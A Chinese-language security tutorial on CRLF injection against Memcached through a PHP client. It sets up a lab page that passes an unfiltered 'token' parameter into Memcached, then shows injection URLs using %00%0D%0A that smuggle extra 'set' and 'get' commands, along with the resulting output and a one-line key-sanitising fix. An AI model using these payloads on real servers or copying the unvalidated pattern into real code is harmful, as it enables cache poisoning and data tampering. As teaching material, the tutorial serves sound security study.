## CRLF描述

在正式讲解前，我们先简单了解下CRLF注入漏洞。

在HTTP报文中，状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。而CRLF漏洞的产生则是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符串，攻击者一旦成功注入CRLF，就会在响应中输入，所以也称为HTTP响应拆分漏洞。

在CRLF中，“CR”意为回车（例：\r、%0D），“LF”意为换行符（例：\n、%0A）。在Windows系统中，CRLF表示行的结束；Linux则以LF表示行的结束；MacOS，不会有人拿MacOS做服务器吧。。。

一般来说更多是将CRLF用于会话固定漏洞、XSS漏洞和窃取cookie等，但是CRLF注入漏洞也可以利用在Web应用程序中。

## 漏洞环境

Memcached是一个开源、高性能的分布式内存对象缓存系统。

影响版本：

V2.2.0及以下版本

在早些时候Memcached也爆发过CRLF注入，而本次绕过则是根据之前爆发过的CRLF注入而产生的1Day漏洞，因为是1Day所以直接下最新版即可。

笔者用的Kali Linux做的环境，编写以下代码文件如1-1所示，并放到网页目录下。

    
    
    <?php
    $server = new \Memcached();
    $server->addServer('localhost', 11211);
    $token = $_GET['token'];
    $server->set("wolf","poc") ;
    echo "[token] = ";
    var_dump($server->get("$token")); 
    echo "[wolf] = ";
    var_dump($server->get("wolf"));

代码文件 1-1

在Kali Linux终端输入命令：

    
    
    apt-get install memcached

安装Memcached后，输入以下命令：

    
    
    service memcached start  //开启Memcached服务
    netstat -ntlp  //查看服务是否开启

![](https://image.3001.net/images/20220411/1649677087_6254131fb3ece1689bb4e.png)看到11211端口为监听状态则代表Memcached服务正常开启，然后只需要配置php环境重启Apache2即可。

## Memcached命令

在搭建好漏洞环境后，我们先简单了解下Memcached的命令，会更加方便后续的漏洞利用。

### set命令

Memcached的set命令用于将value存储在指定的key中，如果key已存在则会更新key值。

基本语法如下：

    
    
    set key flags exptime bytes [noreply] 
    value 

  * **key** ：键值 key-value 结构中的 key，用于查找缓存值。
  *  **flags** ：可以包括键值对的整型参数，客户机使用它存储关于键值对的额外信息 。
  *  **exptime** ：在缓存中保存键值对的时间长度（以秒为单位，0 表示永远）。
  *  **bytes** ：在缓存中存储的字节数。
  *  **noreply** （可选）： 该参数告知服务器不需要返回数据。
  *  **value** ：存储的值（始终位于第二行）（可直接理解为key-value结构中的value）。

这里笔者构建个实例方便读者理解：

![](https://image.3001.net/images/20220411/1649677864_625416281d93b3cbc45ac.png)其中key值为”snowwolf”，那么flag就是“0”，exptime则是“100”，代表以100秒为单位的数据过期时间，bytes为“4”，代表数据存储的字节数为“4”，如果数据设置成功则会输出“STORED”状态。

### get命令

Memcached的get命令获取存储在key中的value，如果key不存在则会返回为空。

基本语法如下：

    
    
    get key
    或
    get key1 key2 key3

  *  **key：** 键值 key-value 结构中的 key，用于查找缓存值。

以之前实例为例：

![](https://image.3001.net/images/20220411/1649678358_625418168f7c33747c200.png)可以看到成功获取到实例值，并且输出“END”代表结束。

如果要查看更多命令实例，可以去[菜鸟教程](https://www.runoob.com/memcached/memcached-tutorial.html)查看，命令都写了就有人说我蹭字数了。。![](https://image.3001.net/images/20220411/1649682975_62542a1f177c2bf2d7de0.jpg!small)

## 漏洞利用

终于到了这个紧张又不刺激的时刻了，为了方便做实验，而且更贴近现实生产环境，我们将数据过期时间调高点：

![](https://image.3001.net/images/20220411/1649679157_62541b351f1b261ad7a30.png)打开我们的浏览器并访问：

    
    
    http://127.0.0.1/test.php?token=snowwolf get snowwolf

![](https://image.3001.net/images/20220411/1649682095_625426afb724a44767bf5.png)

可以看到虽然没什么区别，不过当我们打开Wireshark，并输入过滤语法：

    
    
    tcp.port == 11211 && memcache

![](https://image.3001.net/images/20220411/1649680791_625421979d56049196df9.png)可以看到，成功触发了我们的poc：

![](https://image.3001.net/images/20220411/1649679891_62541e1334e53118b14d3.png)不过现在很多安全设备都不会这么明目张胆直接CRLF注入，就得需要进行绕过了。

## 绕过

Memcached使用二进制协议并接受：\x00、\x20、\x0D、\x0A，就非常的美滋滋。

在浏览器中输入：

    
    
    http://127.0.0.1/test.php?token=TOKEN%00%0D%0Aset%20snowwolf%200%20500%204%0D%0Awolf

![](https://image.3001.net/images/20220411/1649682210_625427223ed14624f1a33.png)并通过CRLF可以看到修改完成。

当然，CRLF注入也可以直接在终端中实现，在终端中输入命令：

    
    
    set snowwolf 0 900 4
    wolf
    STORED
    get snowwolf
    VALUE snowwolf 0 4
    wolf
    END
    
    ERROR
    get snowwolf%00%0D%0Aset%20snowwolf%200%20100%203%0D%0Aexp
    END
    
    ERROR
    get snowwolf%00%0D%0Aget wolf
    VALUE wolf 0 3
    poc
    END
    

可以看到不仅更改了wolf还能通过get直接显示value。

![](https://image.3001.net/images/20220411/1649682810_6254297a7ab6e4702d346.png)

当你看到这里时，那么你就可能拿下全球的Memcached缓存服务器了，至于拿下缓存服务器能干嘛，拜托，拿下缓存服务器超帅的啦~

## 漏洞修复

对所有Memcache请求进行：

    
    
    preg_replace('/\s+/m', '', mb_substr($key, 0, 250))

## 参考文档

<https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf>——Memcached注入手册（推荐收藏）

  

